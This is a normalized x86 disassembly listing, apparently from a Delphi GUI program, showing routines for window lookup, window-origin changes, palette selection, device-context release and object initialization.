mov [ eax + 0x20 ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4391c0
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_404114
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x8 ] 0x0
sete al
mov [ ebx + 0x74 ] al
mov eax [ rw-data ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x11 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xd ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x18 ]
mov [ ebp - 0x11 ] edx
mov edx [ eax + 0x1c ]
mov [ ebp - 0xd ] edx
jmp r-xdata
mov [ ebp - 0x9 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x74 ] 0x0
jne r-xdata
push ebp
call sub_43a2cc
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
call sub_439bd4
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_445a0c
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a5ea
mov eax [ rw-data ]
call sub_403f64
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
mov dl 0x1
call sub_44e778
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x5 ] 0x0
mov eax [ ebp - 0xd ]
push eax
movzx eax [ ebp - 0x9 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x11 ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_43d400
jmp r-xdata
mov edx [ eax + 0x268 ]
cmp edx [ ebx + 0x40 ]
jne r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_43a587
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
push edx
mov edx [ rw-data ]
add edx 0x10
push edx
mov edx [ rw-data ]
mov edx [ edx + 0xc ]
mov ecx [ rw-data ]
xchg edx eax
call sub_439aa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x14 ] ecx
xor edx edx
mov [ ebp - 0x11 ] edx
xor edx edx
mov [ ebp - 0xd ] edx
xor edx edx
call sub_452fa4
retn
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
sub_43a5ea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403f64
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4040f0
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
sub_43a67c
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_438b98
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43a6b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43a67c
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
push 0x0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebp
call sub_43bc78
lea edx [ esp + 0x8 ]
mov ecx ebx
mov eax ebp
call sub_440d20
test eax eax
je r-xdata
mov esi eax
sub_43a6fc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_416668
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx ] eax
sub_43a724
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_416964
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403f64
xor eax eax
mov [ ebx ] eax
sub_43a744
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43a774
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_416b90
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43a824
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416bf4
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_43a7fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43a9b0
call sub_404884
call sub_404884
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4167c8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_4243f4
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_43a830
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_416b90
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43a8ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a8d5
mov eax [ rw-data ]
call sub_416bf4
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43a8a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43a9b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424450
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4167c8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4243f4
test al al
je r-xdata
sub_43a8dc
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_43a9b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4240dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_43a908
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4245e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4245e4
mov eax [ ebp - 0x4 ]
call sub_43a9fc
mov eax [ rw-data ]
call sub_416b90
mov ebx eax
xor eax eax
push ebp
push sub_43a98d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_416668
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416bf4
retn
call sub_43a774
sub_43a9b0
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4245e4
mov edx ebx
mov eax [ rw-data ]
call sub_416ba4
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_43a9fc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43c81c
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_43aa28
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_43aa64
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_416eac
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_43aaac
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43ab68
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ac35
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ac3c
lea eax [ ebp - 0x1c ]
call sub_404e44
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_404160
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x84 ]
call sub_430984
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_40ada8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_404e98
sub_43ac58
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43acbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44b9cc
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43c148
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
mov edx [ eax + 0x64 ]
pop eax
call sub_405270
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43acc6
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov al 0x1
sub_43ace0
push ebx
mov ebx eax
mov eax ebx
call sub_44b9f4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43ad28
push ebx
mov ebx eax
mov eax ebx
call sub_44ba44
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x84 ]
call sub_405270
je r-xdata
mov al 0x1
pop ebx
retn
sub_43ad60
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_404114
mov eax [ eax + 0xa4 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x80 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_43ada0
push ebx
mov ebx eax
mov eax ebx
call sub_44ba80
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
movzx eax [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43add4
push ebx
mov ebx eax
mov eax ebx
call sub_41e368
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x110 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43adfc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43c178
sub_43ae20
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43ae44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x84
mov edx esi
call sub_404e98
sub_43ae68
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43c068
sub_43ae88
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x110 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x114 ] edx
sub_43aeb4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x160 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x15c ]
call sub_405270
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
movzx eax [ edi + 0x70 ]
cmp al [ esi + 0x158 ]
je r-xdata
mov al 0x1
sub_43af1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43ba34
sub_43af3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43ba20
sub_43af5c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x158 ] bl
sub_43af7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43c0fc
sub_43afa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41da5c
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x78 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423438
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43c1f8
movzx eax [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43aa28
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_43d1bc
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4493c8
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_43ec70
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x8e ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7e ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xac ] eax
mov [ ebx + 0x158 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_43b098
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_404330
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_457434
mov eax [ edi + 0x94 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4042d8
mov edx edi
call sub_41dd70
push edi
mov eax [ edi + 0x94 ]
xor ecx ecx
mov edx 0xb039
call sub_43d400
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov edx esp
mov eax edi
call sub_43ba58
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_404160
xor eax eax
mov [ edi + 0x94 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403f64
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403f64
mov eax [ edi + 0x68 ]
call sub_403f64
mov eax [ edi + 0x64 ]
call sub_40a57c
mov eax [ edi + 0x78 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41daa8
test bl bl
jle r-xdata
sub_43b17c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_43b1a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov edi eax
xor ebx ebx
cmp [ edi + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffd7
call sub_404160
mov ebp eax
test ebp ebp
je r-xdata
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
movzx eax [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push ebp
push esi
call SelectPalette
mov ebp eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push ebp
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_43b230
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
movzx eax [ esp ]
cmp al [ esi + 0x61 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
movzx ebx [ esi + 0x61 ]
movzx eax [ esp ]
mov [ esi + 0x61 ] al
test [ esi + 0x1c ] 0x1
jne r-xdata
movzx eax [ r-xdata ]
cmp al bl
je r-xdata
mov eax esi
call sub_43b644
movzx eax [ r-xdata ]
cmp al [ esi + 0x61 ]
jne r-xdata
mov eax [ esi + 0x180 ]
cmp eax [ esi + 0x40 ]
jne r-xdata
mov eax [ esi + 0x188 ]
push eax
mov eax [ esi + 0x18c ]
push eax
mov ecx [ esi + 0x184 ]
mov edx [ esi + 0x180 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
mov eax [ esi + 0x184 ]
cmp eax [ esi + 0x44 ]
jne r-xdata
mov eax [ esi + 0x188 ]
cmp eax [ esi + 0x48 ]
jne r-xdata
mov eax [ esi + 0x18c ]
cmp eax [ esi + 0x4c ]
je r-xdata
sub_43b2d0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403f64
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_43e77c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_404160
mov edx ebx
mov eax edi
call sub_41db30
mov eax ebx
mov si 0xffd9
call sub_404160
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_43b364
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x55 ] 0x8
setne al
xor al 0x1
cmp dl al
je r-xdata
test dl dl
jne r-xdata
and [ ebx + 0x54 ] 0xf7ff
or [ ebx + 0x54 ] 0x800
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax ebx
call sub_43c59c
sub_43b3d0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41ded4
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43d400
sub_43b464
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41dd8c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x80 ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_43c0fc
jmp r-xdata
cmp edi [ esi + 0x94 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_43b2d0
jmp r-xdata
xor eax eax
mov [ esi + 0x94 ] eax
sub_43b4bc
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
movzx eax [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
movzx eax bl
movzx edx [ eax + rw-data ]
mov eax edi
call sub_43b230
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
movzx eax [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
cmp [ esp ] 0x0
je r-xdata
movzx eax [ esp ]
test al al
je r-xdata
mov eax edi
mov si 0xffee
call sub_404160
test bl bl
jne r-xdata
sub al 0x5
je r-xdata
mov eax [ edi + 0x188 ]
push eax
mov eax [ edi + 0x18c ]
push eax
mov ecx [ edi + 0x184 ]
mov edx [ edi + 0x180 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
mov eax ebx
test al al
je r-xdata
sub al 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_43b5a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_43de44
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
